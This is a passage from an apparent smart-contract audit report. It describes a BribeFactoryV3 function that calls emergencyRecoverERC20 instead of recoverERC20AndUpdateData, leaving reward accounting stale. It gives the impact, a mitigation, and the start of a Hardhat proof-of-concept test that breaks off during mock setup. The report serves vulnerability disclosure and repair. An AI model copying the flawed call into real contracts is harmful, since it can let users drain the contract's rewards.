<pre data-index="51" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">recoverERC20AndUpdateData</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">_bribe</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">_tokens</span><span class="mtk1">, </span><span class="mtk12">uint</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">_amounts</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">_bribe</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1"> == </span><span class="mtk12">_tokens</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1">, </span><span class="mtk8">'MISMATCH_LEN'</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">_tokens</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1"> == </span><span class="mtk12">_amounts</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1">, </span><span class="mtk8">'MISMATCH_LEN'</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">for</span><span class="mtk1">(</span><span class="mtk12">i</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">_bribe</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++){</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1">(</span><span class="mtk12">_amounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">] &gt; </span><span class="mtk7">0</span><span class="mtk1">) </span><span class="mtk11">IBribe</span><span class="mtk1">(</span><span class="mtk12">_bribe</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]).</span><span class="mtk11">emergencyRecoverERC20</span><span class="mtk1">(</span><span class="mtk12">_tokens</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">], </span><span class="mtk12">_amounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>The function calls <code>IBribe(_bribe[i]).emergencyRecoverERC20</code> instead of <code>IBribe(_bribe[i]).recoverERC20AndUpdateData</code>. The correct function, <code>recoverERC20AndUpdateData</code> in the <code>Bribe</code> contract, updates the <code>tokenRewardsPerEpoch</code> mapping to reflect the recovered tokens:</p>
<pre data-index="52" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">recoverERC20AndUpdateData</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">tokenAddress</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">tokenAmount</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">onlyAllowed</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">tokenAmount</span><span class="mtk1"> &lt;= </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">tokenAddress</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">)), </span><span class="mtk8">"TOO_MUCH"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">_startTimestamp</span><span class="mtk1"> = </span><span class="mtk11">IMinter</span><span class="mtk1">(</span><span class="mtk12">minter</span><span class="mtk1">).</span><span class="mtk11">active_period</span><span class="mtk1">() + </span><span class="mtk12">WEEK</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">_lastReward</span><span class="mtk1"> = </span><span class="mtk12">tokenRewardsPerEpoch</span><span class="mtk1">[</span><span class="mtk12">tokenAddress</span><span class="mtk1">][</span><span class="mtk12">_startTimestamp</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">tokenRewardsPerEpoch</span><span class="mtk1">[</span><span class="mtk12">tokenAddress</span><span class="mtk1">][</span><span class="mtk12">_startTimestamp</span><span class="mtk1">] = </span><span class="mtk12">_lastReward</span><span class="mtk1"> - </span><span class="mtk12">tokenAmount</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">tokenAddress</span><span class="mtk1">).</span><span class="mtk11">safeTransfer</span><span class="mtk1">(</span><span class="mtk12">owner</span><span class="mtk1">, </span><span class="mtk12">tokenAmount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">Recovered</span><span class="mtk1">(</span><span class="mtk12">tokenAddress</span><span class="mtk1">, </span><span class="mtk12">tokenAmount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>In contrast, <code>emergencyRecoverERC20</code> only transfers tokens without updating the mapping:</p>
<pre data-index="53" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">emergencyRecoverERC20</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">tokenAddress</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">tokenAmount</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">onlyAllowed</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">tokenAmount</span><span class="mtk1"> &lt;= </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">tokenAddress</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">)), </span><span class="mtk8">"TOO_MUCH"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">tokenAddress</span><span class="mtk1">).</span><span class="mtk11">safeTransfer</span><span class="mtk1">(</span><span class="mtk12">owner</span><span class="mtk1">, </span><span class="mtk12">tokenAmount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">Recovered</span><span class="mtk1">(</span><span class="mtk12">tokenAddress</span><span class="mtk1">, </span><span class="mtk12">tokenAmount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<h3 style="position:relative;" id="impact-8"><a class="anchor before" aria-label="impact 8 permalink" href="#impact-8"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>Incorrect reward accounting - failing to update <code>tokenRewardsPerEpoch</code> can lead to over-distribution of rewards. Users may claim rewards based on outdated values, potentially draining the <code>Bribe</code> contract’s token balance.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-12"><a class="anchor before" aria-label="recommended mitigation steps 12 permalink" href="#recommended-mitigation-steps-12"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Update the function Call in <code>BribeFactoryV3</code>:</p>
<p>Modify the <code>recoverERC20AndUpdateData</code> function in <code>BribeFactoryV3.sol</code> to call the correct <code>recoverERC20AndUpdateData</code> function.</p>
<h3 style="position:relative;" id="proof-of-concept-7"><a class="anchor before" aria-label="proof of concept 7 permalink" href="#proof-of-concept-7"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<pre data-index="54" data-language="javascript" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">const</span><span class="mtk1"> { </span><span class="mtk12">expect</span><span class="mtk1"> } = </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk8">"chai"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">const</span><span class="mtk1"> { </span><span class="mtk12">ethers</span><span class="mtk1">, </span><span class="mtk12">upgrades</span><span class="mtk1"> } = </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk8">"hardhat"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">const</span><span class="mtk1"> { </span><span class="mtk12">ZERO_ADDRESS</span><span class="mtk1"> } = </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk8">"@openzeppelin/test-helpers/src/constants.js"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">describe</span><span class="mtk1">(</span><span class="mtk8">"BribeFactoryV3 Recovery Functions"</span><span class="mtk1">, </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">bribeFactory</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">mockToken</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">bribe</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">owner</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">voter</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">gaugeManager</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">permissionsRegistry</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">tokenHandler</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">mockVoter</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">mockGaugeManager</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">mockTokenHandler</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">mockVe</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">mockMinter</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">beforeEach</span><span class="mtk1">(</span><span class="mtk4">async</span><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Get signers</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        [</span><span class="mtk12">owner</span><span class="mtk1">, </span><span class="mtk12">voter</span><span class="mtk1">, </span><span class="mtk12">gaugeManager</span><span class="mtk1">, </span><span class="mtk12">permissionsRegistry</span><span class="mtk1">, </span><span class="mtk12">tokenHandler</span><span class="mtk1">] = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getSigners</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Deploy mock token</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">MockToken</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getContractFactory</span><span class="mtk1">(</span><span class="mtk8">"MockERC20"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">mockToken</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">MockToken</span><span class="mtk1">.</span><span class="mtk11">deploy</span><span class="mtk1">(</span><span class="mtk8">"Mock Token"</span><span class="mtk1">, </span><span class="mtk8">"MTK"</span><span class="mtk1">, </span><span class="mtk7">18</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mockToken</span><span class="mtk1">.</span><span class="mtk11">deployed</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Deploy mock Voter</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">MockVoter</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getContractFactory</span><span class="mtk1">(</span><span class="mtk8">"MockVoter"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">mockVoter</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">MockVoter</span><span class="mtk1">.</span><span class="mtk11">deploy</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mockVoter</span><span class="mtk1">.</span><span class="mtk11">deployed</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Deploy mock GaugeManager</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">MockGaugeManager</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getContractFactory</span><span class="mtk1">(</span><span class="mtk8">"MockGaugeManager"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">mockGaugeManager</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">MockGaugeManager</span><span class="mtk1">.</span><span class="mtk11">deploy</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mockGaugeManager</span><span class="mtk1">.</span><span class="mtk11">deployed</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Deploy mock TokenHandler</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">MockTokenHandler</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getContractFactory</span><span class="mtk1">(</span><span class="mtk8">"MockTokenHandler"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">mockTokenHandler</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">MockTokenHandler</span><span class="mtk1">.</span><span class="mtk11">deploy</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mockTokenHandler</span><span class="mtk1">.</span><span class="mtk11">deployed</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Deploy mock VotingEscrow</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">MockVotingEscrow</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getContractFactory</span><span class="mtk1">(</span><span class="mtk8">"MockVotingEscrow"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">mockVe</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">MockVotingEscrow</span><span class="mtk1">.</span><span class="mtk11">deploy</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mockVe</span><span class="mtk1">.</span><span class="mtk11">deployed</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Deploy mock Minter</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">MockMinter</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getContractFactory</span><span class="mtk1">(</span><span class="mtk8">"MockMinter"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">mockMinter</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">MockMinter</span><span class="mtk1">.</span><span class="mtk11">deploy</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mockMinter</span><span class="mtk1">.</span><span class="mtk11">deployed</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Set up mock Voter to return mock VE</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mockVoter</span><span class="mtk1">.</span><span class="mtk11">setVe</span><span class="mtk1">(</span><span class="mtk12">mockVe</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Set up mock GaugeManager to return minter</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mockGaugeManager</span><span class="mtk1">.</span><span class="mtk11">setMinter</span><span class="mtk1">(</span><span class="mtk12">mockMinter</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Set initial active period</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mockMinter</span><span class="mtk1">.</span><span class="mtk11">setActivePeriod</span><span class="mtk1">(</span><span class="mtk10">Math</span><span class="mtk1">.</span><span class="mtk11">floor</span><span class="mtk1">(</span><span class="mtk10">Date</span><span class="mtk1">.</span><span class="mtk11">now</span><span class="mtk1">() / </span><span class="mtk7">1000</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Deploy BribeFactoryV3 as upgradeable</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">BribeFactoryV3</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getContractFactory</span><span class="mtk1">(</span><span class="mtk8">"BribeFactoryV3"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bribeFactory</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">upgrades</span><span class="mtk1">.</span><span class="mtk11">deployProxy</span><span class="mtk1">(</span><span class="mtk12">BribeFactoryV3</span><span class="mtk1">, [</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">mockVoter</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">mockGaugeManager</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">permissionsRegistry</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">mockTokenHandler</span><span class="mtk1">.</span><span class="mtk12">address</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        ], { </span><span class="mtk12">initializer:</span><span class="mtk1"> </span><span class="mtk8">'initialize'</span><span class="mtk1"> });</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">bribeFactory</span><span class="mtk1">.</span><span class="mtk11">deployed</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Create a bribe contract</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">tx</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">bribeFactory</span><span class="mtk1">.</span><span class="mtk11">createBribe</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">owner</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">mockToken</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">mockToken</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">"test"</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">receipt</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tx</span><span class="mtk1">.</span><span class="mtk11">wait</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Get the bribe address from the factory's last_bribe variable</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">bribeAddress</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">bribeFactory</span><span class="mtk1">.</span><span class="mtk11">last_bribe</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bribe</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getContractAt</span><span class="mtk1">(</span><span class="mtk8">"Bribe"</span><span class="mtk1">, </span><span class="mtk12">bribeAddress</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Add some tokens to the bribe contract</span></span></span>
